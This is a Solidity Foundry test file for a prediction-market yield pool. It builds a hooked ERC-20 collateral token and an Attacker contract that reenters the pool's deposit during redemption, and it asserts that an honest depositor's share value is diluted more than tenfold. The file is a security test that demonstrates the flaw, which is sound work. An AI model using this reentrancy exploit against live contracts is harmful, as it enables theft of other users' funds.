// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.34;

import {IERC20} from "forge-std/interfaces/IERC20.sol";
import {IERC4626} from "forge-std/interfaces/IERC4626.sol";

import {BaseTest} from "test/Base.t.sol";
import {MockERC4626} from "test/mocks/MockERC4626.sol";
import {OutcomeYieldPool} from "src/OutcomeYieldPool.sol";

/// @notice An ERC-777-style collateral: calls a registered hook on the *recipient side* after a plain `transfer`.
/// Nothing about it is hostile to the vault or to ConditionalTokens; it is simply a token with a transfer callback.
contract HookERC20 is IERC20 {
    string public name = "Hooked Collateral";
    string public symbol = "hCOL";
    uint8 public decimals = 6;

    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    address public hookFor; // recipient whose inbound transfers trigger the hook
    address public hook;

    function setHook(address recipient, address h) external {
        hookFor = recipient;
        hook = h;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
        emit Transfer(address(0), to, amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _move(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        _move(from, to, amount);
        return true;
    }

    function _move(address from, address to, uint256 amount) internal {
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        if (to == hookFor && hook != address(0)) Hooked(hook).tokensReceived(amount);
    }
}

interface Hooked {
    function tokensReceived(uint256 amount) external;
}

/// @notice The attacker. Holds outcome tokens, and when the hook fires (mid-redemption, after the vault has paid the
/// pool but before `splitPosition` runs) deposits into the *counterparty* side at the momentarily understated price.
contract Attacker is Hooked {
    OutcomeYieldPool public pool;
    uint256 public reenterAmount;
    bool public armed;
    bool public fired;

    function arm(OutcomeYieldPool p, uint256 amount) external {
        pool = p;
        reenterAmount = amount;
        armed = true;
    }

    function tokensReceived(uint256) external {
        if (!armed || fired) return;
        fired = true;
        pool.deposit(false, reenterAmount, address(this));
    }

    function onERC1155Received(address, address, uint256, uint256, bytes calldata) external pure returns (bytes4) {
        return this.onERC1155Received.selector;
    }

    function onERC1155BatchReceived(address, address, uint256[] calldata, uint256[] calldata, bytes calldata)
        external
        pure
        returns (bytes4)
    {
        return this.onERC1155BatchReceived.selector;
    }
}

contract ReentrancyTest is BaseTest {
    HookERC20 internal hookCollateral;
    MockERC4626 internal honestVault;
    Attacker internal attacker;
    Market internal m;

    uint256 internal yesId;
    uint256 internal noId;

    function setUp() public override {
        super.setUp();

        hookCollateral = new HookERC20();
        honestVault = new MockERC4626(IERC20(address(hookCollateral)));
        attacker = new Attacker();

        m = _createMarket(IERC4626(address(honestVault)), keccak256("hooked-market"));

        yesId = _positionId(IERC20(address(hookCollateral)), m.conditionId, true);
        noId = _positionId(IERC20(address(hookCollateral)), m.conditionId, false);
    }

    function _mintSets(address who, uint256 amount) internal {
        hookCollateral.mint(who, amount);
        uint256[] memory partition = new uint256[](2);
        partition[0] = 1;
        partition[1] = 2;
        vm.startPrank(who);
        hookCollateral.approve(address(ct), amount);
        ct.splitPosition(IERC20(address(hookCollateral)), PARENT_COLLECTION_ID, m.conditionId, partition, amount);
        ct.setApprovalForAll(address(m.pool), true);
        vm.stopPrank();
    }

    function testReentrantDepositMintsSharesAtAnUnderstatedPrice() public {
        uint256 SIZE = 1_000e6;

        // --- honest setup: attacker on YES, Alice on NO, both fully merged and invested ---
        _mintSets(address(attacker), SIZE);
        _mintSets(ALICE, SIZE);

        vm.prank(address(attacker));
        m.pool.deposit(true, SIZE, address(attacker));

        vm.prank(ALICE);
        m.pool.deposit(false, SIZE, ALICE);

        assertEq(honestVault.balanceOf(address(m.pool)), SIZE, "merged and invested");
        assertEq(ct.balanceOf(address(m.pool), yesId), 0, "no dangling YES");
        assertEq(ct.balanceOf(address(m.pool), noId), 0, "no dangling NO");

        uint256 aliceSharesBefore = factory.balanceOf(ALICE, _shareId(m.pool, false));
        uint256 aliceAssetsBefore = SIZE * (_totalAssets(m.pool, false) + VIRTUAL_ASSETS)
            / (factory.totalSupply(_shareId(m.pool, false)) + VIRTUAL_SHARES);
        aliceAssetsBefore = aliceSharesBefore * (_totalAssets(m.pool, false) + VIRTUAL_ASSETS)
            / (factory.totalSupply(_shareId(m.pool, false)) + VIRTUAL_SHARES);

        // --- the attack: fresh NO tokens to deposit from inside the hook ---
        _mintSets(address(attacker), SIZE);
        hookCollateral.setHook(address(m.pool), address(attacker));
        attacker.arm(m.pool, SIZE);

        uint256 attackerYesShares = factory.balanceOf(address(attacker), _shareId(m.pool, true));
        vm.prank(address(attacker));
        m.pool.redeem(true, attackerYesShares, address(attacker), address(attacker));

        assertTrue(attacker.fired(), "hook did not fire");

        // --- outcome ---
        uint256 noSupply = factory.totalSupply(_shareId(m.pool, false));
        uint256 attackerNoShares = factory.balanceOf(address(attacker), _shareId(m.pool, false));
        uint256 noTotalAssets = _totalAssets(m.pool, false);

        uint256 aliceAssetsAfter = aliceSharesBefore * (noTotalAssets + VIRTUAL_ASSETS) / (noSupply + VIRTUAL_SHARES);
        uint256 attackerAssets = attackerNoShares * (noTotalAssets + VIRTUAL_ASSETS) / (noSupply + VIRTUAL_SHARES);

        emit log_named_uint("alice NO assets before", aliceAssetsBefore);
        emit log_named_uint("alice NO assets after ", aliceAssetsAfter);
        emit log_named_uint("attacker NO shares    ", attackerNoShares);
        emit log_named_uint("alice   NO shares     ", aliceSharesBefore);
        emit log_named_uint("attacker NO assets    ", attackerAssets);

        assertLt(aliceAssetsAfter, aliceAssetsBefore / 10, "Alice should have been diluted >10x");
    }
}
